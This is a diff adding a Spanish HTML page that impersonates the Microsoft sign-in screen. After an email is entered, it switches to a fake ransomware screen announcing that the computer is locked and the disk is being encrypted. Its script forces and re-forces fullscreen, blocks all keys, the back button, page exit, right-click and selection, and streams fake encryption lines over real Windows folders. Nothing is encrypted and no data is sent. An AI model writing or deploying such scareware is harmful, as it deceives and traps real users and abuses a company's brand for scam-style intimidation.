@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #fff;
+            background-image: url('https://aadcdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg');
+            background-size: cover;
+            background-position: center;
+            overflow: hidden;
+        }
+        .login-container {
+            background: #fff;
+            width: 440px;
+            padding: 44px;
+            margin: auto;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+            min-width: 320px;
+            max-width: 440px;
+            border-radius: 6px;
+        }
+        .ms-logo {
+            width: 108px;
+            height: 24px;
+            margin-bottom: 16px;
+            display: block;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 600;
+            line-height: 28px;
+            margin: 16px 0 32px 0;
+            padding-top: 8px;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: #1b1b1b;
+        }
+        .subtitle {
+            font-size: 14px;
+            font-weight: 400;
+            line-height: 20px;
+            margin-bottom: 16px;
+            color: #1b1b1b;
+        }
+        .input-email {
+            width: 100%;
+            height: 36px;
+            padding: 6px 10px;
+            border: none;
+            border-bottom: 1px solid #747474;
+            margin: 8px 0 24px 0;
+            font-size: 14px;
+            line-height: 20px;
+            background: #fff;
+            box-sizing: border-box;
+            border-radius: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        .input-email:focus {
+            outline: none;
+            border-bottom: 2px solid #0067b8;
+        }
+        .forgot-link {
+            font-size: 13px;
+            line-height: 20px;
+            color: #0067b8;
+            text-decoration: none;
+            margin-top: 4px;
+            display: inline-block;
+        }
+        .forgot-link:hover {
+            color: #005da6;
+            text-decoration: underline;
+        }
+        .next-button {
+            width: 108px;
+            height: 32px;
+            background: #0067b8;
+            color: #fff;
+            border: none;
+            cursor: pointer;
+            float: right;
+            margin-top: 16px;
+            font-size: 14px;
+            font-weight: 400;
+            min-width: 108px;
+            padding: 4px 12px;
+            font-family: inherit;
+        }
+        .next-button:hover {
+            background: #005da6;
+        }
+        .create-account {
+            font-size: 13px;
+            line-height: 16px;
+            color: #1b1b1b;
+            margin-top: 60px;
+            clear: both;
+        }
+        .create-account a {
+            color: #0067b8;
+            text-decoration: none;
+        }
+        .create-account a:hover {
+            color: #005da6;
+            text-decoration: underline;
+        }
+        .footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            padding: 28px;
+            background: transparent;
+            display: flex;
+            justify-content: flex-start;
+            gap: 16px;
+        }
+        .footer a {
+            color: #000;
+            text-decoration: none;
+            font-size: 12px;
+        }
+        .footer a:hover {
+            text-decoration: underline;
+        }
+        .error-text {
+            color: #e81123;
+            font-size: 12px;
+            line-height: 14px;
+            margin-top: 8px;
+            display: none;
+        }
+        
+        /* Estilos para la pantalla de encriptación */
+        .container {
+            display: none;
+            background-color: #000;
+            padding: 40px;
+            text-align: center;
+            width: 100%;
+            height: 100vh;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        .container h1 {
+            font-size: 36px;
+            color: #ff0000;
+            margin: 16px 0;
+            padding-top: 0;
+            font-family: inherit;
+        }
+        .container p {
+            font-size: 24px;
+            color: #ff0000;
+        }
+        .progress {
+            width: 80%;
+            height: 20px;
+            background: #333;
+            border: 2px solid #ff0000;
+            margin: 20px 0;
+        }
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background: #ff0000;
+            transition: width 0.5s ease;
+        }
+        @keyframes blink {
+            0% { opacity: 1; }
+            50% { opacity: 0; }
+            100% { opacity: 1; }
+        }
+        .blink {
+            animation: blink 1s infinite;
+        }
+        .warning-icon {
+            font-size: 100px;
+            margin-bottom: 30px;
+            color: #ff0000;
+        }
+        #encryptionStatus {
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 18px;
+            color: #ff0000;
+            margin: 20px 0;
+            text-align: left;
+            height: 200px;
+            overflow-y: scroll;
+            width: 80%;
+            background: rgba(0,0,0,0.3);
+            padding: 10px;
+            scrollbar-width: none;
+            -ms-overflow-style: none;
+        }
+        #encryptionStatus::-webkit-scrollbar {
+            display: none;
+        }
+        
+        /* Estilos para la pantalla de carga */
+        .loading-container {
+            display: none;
+            text-align: center;
+            padding: 32px;
+            background: white;
+            max-width: 440px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+        }
+        .spinner {
+            width: 20px;
+            height: 20px;
+            margin: 20px auto;
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #0078d4;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container" id="inicioContainer">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Microsoft" class="ms-logo">
+        <h1>Iniciar sesión</h1>
+        <input type="email" class="input-email" id="emailInput" placeholder="Correo electrónico o número de teléfono" autocomplete="username">
+        <div class="error-text" id="errorText">Escriba una dirección de correo electrónico válida.</div>
+        <a href="#" class="forgot-link">¿Olvidaste tu nombre de usuario?</a>
+        <button class="next-button" onclick="verificarEmail()">Siguiente</button>
+        <div class="create-account">
+            ¿Es nuevo en Microsoft? <a href="#">Crear una cuenta</a>
+        </div>
+    </div>
+
+    <div class="footer">
+        <a href="#">Ayuda</a>
+        <a href="#">Términos de uso</a>
+        <a href="#">Privacidad y cookies</a>
+    </div>
+
+    <div class="loading-container" id="loadingContainer" style="display: none;">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Microsoft Logo" class="ms-logo">
+        <h2 style="font-size: 24px; margin: 16px 0; font-weight: normal;">Esperando verificación</h2>
+        <div class="spinner"></div>
+        <p style="color: #666; font-size: 14px;">Apruebe la solicitud de inicio de sesión en su dispositivo móvil</p>
+    </div>
+
+    <div class="container" id="mainContainer" style="display: none;">
+        <div class="warning-icon">⚠️</div>
+        <h1 class="blink">¡SU EQUIPO HA SIDO BLOQUEADO!</h1>
+        <p>Procediendo a encriptar el disco...</p>
+        <div class="progress">
+            <div class="progress-bar"></div>
+        </div>
+        <div id="encryptionStatus"></div>
+    </div>
+
+    <script>
+        function verificarEmail() {
+            const email = document.getElementById('emailInput').value;
+            const errorText = document.getElementById('errorText');
+            
+            if (email && email.includes('@')) {
+                document.getElementById('inicioContainer').style.display = 'none';
+                document.getElementById('loadingContainer').style.display = 'block';
+                setTimeout(activarBloqueo, 2000);
+                errorText.style.display = 'none';
+            } else {
+                errorText.style.display = 'block';
+                document.getElementById('emailInput').focus();
+            }
+        }
+
+        document.getElementById('emailInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                verificarEmail();
+            }
+        });
+
+        window.onload = function() {
+            document.getElementById('emailInput').focus();
+        };
+
+        function mostrarCarga() {
+            document.getElementById('inicioContainer').style.display = 'none';
+            document.getElementById('loadingContainer').style.display = 'block';
+            setTimeout(activarBloqueo, 3000);
+        }
+
+        function requestFullScreen() {
+            var element = document.documentElement;
+            if (element.requestFullscreen) {
+                element.requestFullscreen();
+            } else if (element.mozRequestFullScreen) {
+                element.mozRequestFullScreen();
+            } else if (element.webkitRequestFullscreen) {
+                element.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT);
+            } else if (element.msRequestFullscreen) {
+                element.msRequestFullscreen();
+            }
+        }
+
+        // Monitorear constantemente el estado de pantalla completa
+        document.addEventListener('fullscreenchange', reapplyFullScreen);
+        document.addEventListener('webkitfullscreenchange', reapplyFullScreen);
+        document.addEventListener('mozfullscreenchange', reapplyFullScreen);
+        document.addEventListener('MSFullscreenChange', reapplyFullScreen);
+
+        function reapplyFullScreen() {
+            // Si ya hemos activado el bloqueo y el usuario sale de pantalla completa, volver a activarla
+            if (document.getElementById('mainContainer').style.display === 'flex' && 
+                !document.fullscreenElement && 
+                !document.webkitFullscreenElement && 
+                !document.mozFullScreenElement && 
+                !document.msFullscreenElement) {
+                setTimeout(requestFullScreen, 100);
+            }
+        }
+
+        function activarBloqueo() {
+            requestFullScreen();
+            document.body.style.backgroundColor = '#000';
+            document.getElementById('loadingContainer').style.display = 'none';
+            document.getElementById('mainContainer').style.display = 'flex';
+
+            window.onbeforeunload = function(e) {
+                e.preventDefault();
+                e.returnValue = '';
+                return '';
+            };
+
+            window.location.hash="no-back-button";
+            window.location.hash="Again-No-back-button";
+            window.onhashchange=function(){
+                window.location.hash="no-back-button";
+            }
+
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Escape' || e.keyCode === 27) {
+                    e.stopPropagation();
+                    e.preventDefault();
+                    return false;
+                }
+                e.preventDefault();
+                return false;
+            }, true);
+
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+            });
+
+            document.addEventListener('selectstart', function(e) {
+                e.preventDefault();
+            });
+
+            document.addEventListener('dragstart', function(e) {
+                e.preventDefault();
+            });
+
+            document.addEventListener('visibilitychange', function() {
+                if (document.hidden) {
+                    requestFullScreen();
+                }
+            });
+
+            document.body.style.userSelect = 'none';
+            document.body.style.webkitUserSelect = 'none';
+            document.body.style.mozUserSelect = 'none';
+            document.body.style.msUserSelect = 'none';
+
+            simularEncriptacion();
+        }
+
+        function simularEncriptacion() {
+            let progress = 0;
+            const archivos = [
+                // Windows System
+                "C:\\Windows\\System32\\drivers\\",
+                "C:\\Windows\\System32\\config\\",
+                "C:\\Windows\\System32\\spool\\",
+                "C:\\Windows\\System32\\wbem\\",
+                "C:\\Windows\\System32\\winevt\\",
+                "C:\\Windows\\Boot\\EFI\\",
+                "C:\\Windows\\Boot\\DVD\\",
+                "C:\\Windows\\Boot\\PCAT\\",
+                "C:\\Windows\\System32\\LogFiles\\",
+                "C:\\Windows\\System32\\GroupPolicy\\",
+                
+                // Program Files
+                "C:\\Program Files\\",
+                "C:\\Program Files (x86)\\",
+                "C:\\Program Files\\Common Files\\",
+                "C:\\Program Files\\Internet Explorer\\",
+                "C:\\Program Files\\Microsoft Office\\",
+                "C:\\Program Files\\Windows Defender\\",
+                "C:\\Program Files\\Windows Mail\\",
+                "C:\\Program Files\\Windows Media Player\\",
+                
+                // User Data
+                "C:\\Users\\Public\\Documents\\",
+                "C:\\Users\\Public\\Pictures\\",
+                "C:\\Users\\Public\\Music\\",
+                "C:\\Users\\Public\\Videos\\",
+                "C:\\Users\\Default\\AppData\\",
+                "C:\\Users\\Administrator\\Documents\\",
+                "C:\\Users\\Administrator\\Pictures\\",
+                "C:\\Users\\Administrator\\Desktop\\",
+                
+                // Application Data
+                "C:\\ProgramData\\Microsoft\\",
+                "C:\\ProgramData\\Adobe\\",
+                "C:\\ProgramData\\McAfee\\",
+                "C:\\ProgramData\\Norton\\",
+                "C:\\ProgramData\\Avast\\",
+                
+                // Personal Files
+                "D:\\Backups\\Documents\\",
+                "D:\\Backups\\Pictures\\",
+                "D:\\Personal\\Family\\",
+                "D:\\Personal\\Work\\",
+                "D:\\Personal\\Videos\\",
+                "E:\\Company_Data\\",
+                "E:\\Projects\\",
+                "E:\\Databases\\",
+                
+                // System Folders
+                "C:\\inetpub\\",
+                "C:\\Recovery\\",
+                "C:\\Config.Msi\\",
+                "C:\\Documents and Settings\\",
+                "C:\\Intel\\Logs\\",
+                "C:\\PerfLogs\\",
+                
+                // Common Files
+                "*.doc", "*.docx", "*.xls", "*.xlsx", "*.pdf", "*.zip",
+                "*.rar", "*.txt", "*.jpg", "*.png", "*.mp4", "*.mp3",
+                "*.ppt", "*.pptx", "*.bak", "*.sql", "*.mdb", "*.pst",
+                "*.ost", "*.dat", "*.log", "*.xml", "*.json", "*.csv"
+            ];
+            
+            const extensiones = [
+                ".doc", ".docx", ".xls", ".xlsx", ".pdf", ".txt",
+                ".jpg", ".png", ".mp4", ".mp3", ".zip", ".rar",
+                ".ppt", ".pptx", ".bak", ".sql", ".mdb", ".pst",
+                ".exe", ".dll", ".sys", ".ini", ".cfg", ".dat"
+            ];
+            
+            const statusElement = document.getElementById('encryptionStatus');
+            const progressBar = document.querySelector('.progress-bar');
+            
+            const interval = setInterval(() => {
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    return;
+                }
+                
+                progress += Math.random() * 0.05;
+                if (progress > 100) progress = 100;
+                
+                progressBar.style.width = progress + '%';
+                
+                const archivoActual = archivos[Math.floor(Math.random() * archivos.length)];
+                const extension = extensiones[Math.floor(Math.random() * extensiones.length)];
+                const nombreArchivo = Math.random().toString(36).substring(7);
+                
+                if (archivoActual.startsWith("*.")) {
+                    statusElement.innerHTML += `Encriptando: ${nombreArchivo}${archivoActual.substring(1)} <br>`;
+                } else {
+                    statusElement.innerHTML += `Encriptando: ${archivoActual}${nombreArchivo}${extension} <br>`;
+                }
+                statusElement.scrollTop = statusElement.scrollHeight;
+                
+            }, 100);
+        }
+    </script>
+</body>
+</html>
